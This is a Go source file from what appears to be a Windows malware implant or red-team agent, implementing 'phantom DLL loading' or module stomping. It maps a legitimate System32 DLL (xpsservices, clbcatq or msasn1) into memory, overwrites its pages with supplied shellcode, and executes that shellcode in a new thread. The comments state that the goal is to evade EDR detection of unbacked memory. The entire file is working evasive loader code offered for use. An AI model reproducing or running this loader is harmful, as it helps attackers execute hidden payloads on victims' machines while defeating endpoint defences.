//go:build windows

package agent

// UDRL — User-Defined Reflective Loader / Phantom DLL Loading.
//
// Technique: "module stomping" — shellcode is copied into a memory region that
// is backed by a legitimate DLL image on disk.  From an EDR's perspective the
// memory is module-backed (appears to belong to a real file), not anonymous/
// private.  This defeats "unsigned or unlinked memory" detection heuristics.
//
// Flow:
//  1. findHostDLL   — pick a small, rarely-loaded System32 DLL
//  2. NtOpenFile    — obtain a file handle to that DLL (NT namespace)
//  3. NtCreateSection(SEC_IMAGE) — create an image-backed section from it
//  4. NtMapViewOfSection — map the section locally (CoW: writes stay private)
//  5. NtProtectVirtualMemory RW — trigger copy-on-write on the target pages
//  6. copy shellcode — overwrite the DLL-backed pages with our payload
//  7. NtProtectVirtualMemory RX — pages are now executable (never RWX)
//  8. NtCreateThreadEx / CreateThread — execute from the DLL-backed address

import (
	"fmt"
	"os"
	"unsafe"

	"golang.org/x/sys/windows"
)

// secImageAttr is SEC_IMAGE: the section is backed by a mapped image (PE).
const secImageAttr = 0x01000000

// ntSyncIONonAlert and ntNonDirFile are OpenOptions flags for NtOpenFile.
// (These live in a different constant namespace than DesiredAccess flags.)
const (
	ntSyncIONonAlert = 0x00000020 // FILE_SYNCHRONOUS_IO_NONALERT
	ntNonDirFile     = 0x00000040 // FILE_NON_DIRECTORY_FILE
)

// ioStatusBlock mirrors IO_STATUS_BLOCK (two pointer-sized fields).
type ioStatusBlock struct {
	Status      uintptr
	Information uintptr
}

// procNtOpenFile is the only new NT proc needed here.
// All other procs (NtCreateSection, NtMapViewOfSection, NtUnmapViewOfSection,
// NtProtectVirtualMemory, NtClose) are declared in inject_evasive_windows.go.
var procNtOpenFile = ntdll.NewProc("NtOpenFile")

// findHostDLL returns the absolute path of the first available candidate DLL.
// These are small, infrequently loaded DLLs whose image section is large enough
// to hold typical shellcode payloads.
func findHostDLL() string {
	sysroot := os.Getenv("SystemRoot")
	if sysroot == "" {
		sysroot = `C:\Windows`
	}
	for _, name := range []string{
		`\System32\xpsservices.dll`,
		`\System32\clbcatq.dll`,
		`\System32\msasn1.dll`,
	} {
		p := sysroot + name
		if _, err := os.Stat(p); err == nil {
			return p
		}
	}
	return ""
}

// phantomLoad implements the phantom DLL / module stomping technique.
// It maps shellcode sc into a memory region that Windows (and EDRs) attribute
// to a legitimate DLL on disk, then executes it in a new thread.
// Returns a descriptive success string or an error.
func phantomLoad(sc []byte) (string, error) {
	if len(sc) == 0 {
		return "", fmt.Errorf("phantomLoad: empty shellcode")
	}

	hostPath := findHostDLL()
	if hostPath == "" {
		return "", fmt.Errorf("phantomLoad: no suitable host DLL found in System32")
	}

	// ── 1. NtOpenFile — file handle to the host DLL ───────────────────────────
	// Windows NT-namespace path: "\??\C:\Windows\System32\<dll>"
	ntPath := `\??\` + hostPath
	pathU16 := windows.StringToUTF16(ntPath)
	ustr := unicodeString64{
		Length:    uint16(len(ntPath) * 2),
		MaxLength: uint16(len(ntPath)*2 + 2),
		Buffer:    uintptr(unsafe.Pointer(&pathU16[0])),
	}
	oa := objectAttributes64{
		Length:     48,
		ObjName:    uintptr(unsafe.Pointer(&ustr)),
		Attributes: objCaseInsensitive,
	}
	var isb ioStatusBlock
	var fileH uintptr
	r, _, _ := procNtOpenFile.Call(
		uintptr(unsafe.Pointer(&fileH)),
		uintptr(windows.FILE_READ_DATA|windows.FILE_EXECUTE|windows.SYNCHRONIZE),
		uintptr(unsafe.Pointer(&oa)),
		uintptr(unsafe.Pointer(&isb)),
		uintptr(windows.FILE_SHARE_READ|windows.FILE_SHARE_DELETE),
		uintptr(ntSyncIONonAlert|ntNonDirFile),
	)
	if r != 0 {
		return "", fmt.Errorf("NtOpenFile(%s): 0x%X", hostPath, r)
	}
	defer procNtClose.Call(fileH)

	// ── 2. NtCreateSection(SEC_IMAGE) — image-backed section ─────────────────
	// MaximumSize = 0 for file-backed sections (kernel uses file size).
	// PAGE_READONLY: for SEC_IMAGE the PE headers determine actual protections.
	var sectionH uintptr
	r, _, _ = procNtCreateSection.Call(
		uintptr(unsafe.Pointer(&sectionH)),
		uintptr(SECTION_ALL_ACCESS),
		0,
		0,
		uintptr(windows.PAGE_READONLY),
		uintptr(secImageAttr),
		fileH,
	)
	if r != 0 {
		return "", fmt.Errorf("NtCreateSection(SEC_IMAGE): 0x%X", r)
	}
	defer procNtClose.Call(sectionH)

	// ── 3. NtMapViewOfSection — CoW view into current process ─────────────────
	// PAGE_EXECUTE_WRITECOPY: signal CoW intent; pages start with PE protections
	// but become private on first write.  Fallback: PAGE_EXECUTE_READ then NtProtect.
	var mappedBase uintptr
	var viewSize uintptr // 0 → kernel maps the full section

	r, _, _ = procNtMapViewOfSection.Call(
		sectionH,
		uintptr(windows.CurrentProcess()),
		uintptr(unsafe.Pointer(&mappedBase)),
		0, 0, 0,
		uintptr(unsafe.Pointer(&viewSize)),
		uintptr(ViewShare),
		0,
		uintptr(windows.PAGE_EXECUTE_WRITECOPY),
	)
	if r != 0 {
		// Fallback: map as execute-read; NtProtect will trigger CoW below.
		mappedBase = 0
		viewSize = 0
		r, _, _ = procNtMapViewOfSection.Call(
			sectionH,
			uintptr(windows.CurrentProcess()),
			uintptr(unsafe.Pointer(&mappedBase)),
			0, 0, 0,
			uintptr(unsafe.Pointer(&viewSize)),
			uintptr(ViewShare),
			0,
			uintptr(windows.PAGE_EXECUTE_READ),
		)
		if r != 0 {
			return "", fmt.Errorf("NtMapViewOfSection: 0x%X", r)
		}
	}

	// Clamp the write to the actual mapped size.
	writeSize := uintptr(len(sc))
	if writeSize > viewSize {
		writeSize = viewSize
	}

	// ── 4. NtProtectVirtualMemory RW — CoW triggers; pages become private ─────
	var oldProt uint32
	if err := ntProtectEx(windows.CurrentProcess(), mappedBase, writeSize,
		windows.PAGE_READWRITE, &oldProt); err != nil {
		procNtUnmapViewOfSection.Call(uintptr(windows.CurrentProcess()), mappedBase)
		return "", fmt.Errorf("phantomLoad protect RW: %w", err)
	}

	// ── 5. Copy shellcode into the DLL-backed CoW pages ───────────────────────
	dst := unsafe.Slice((*byte)(unsafe.Pointer(mappedBase)), writeSize)
	copy(dst, sc[:writeSize])

	// ── 6. NtProtectVirtualMemory RX — memory never had RWX ──────────────────
	if err := ntProtectEx(windows.CurrentProcess(), mappedBase, writeSize,
		windows.PAGE_EXECUTE_READ, &oldProt); err != nil {
		procNtUnmapViewOfSection.Call(uintptr(windows.CurrentProcess()), mappedBase)
		return "", fmt.Errorf("phantomLoad protect RX: %w", err)
	}

	// ── 7. Execute — prefer spoofed NtCreateThreadEx, fall back to CreateThread ─
	if th, err := hgCreateThreadEx(windows.CurrentProcess(), mappedBase, 0); err == nil {
		windows.CloseHandle(th)
	} else {
		r2, _, e2 := procCreateThread.Call(0, 0, mappedBase, 0, 0, 0)
		if r2 == 0 {
			procNtUnmapViewOfSection.Call(uintptr(windows.CurrentProcess()), mappedBase)
			return "", fmt.Errorf("CreateThread fallback: %v", e2)
		}
		windows.CloseHandle(windows.Handle(r2))
	}

	return fmt.Sprintf("[+] phantomLoad: host=%s mapped=0x%x sc=%d B → executing",
		hostPath, mappedBase, len(sc)), nil
}
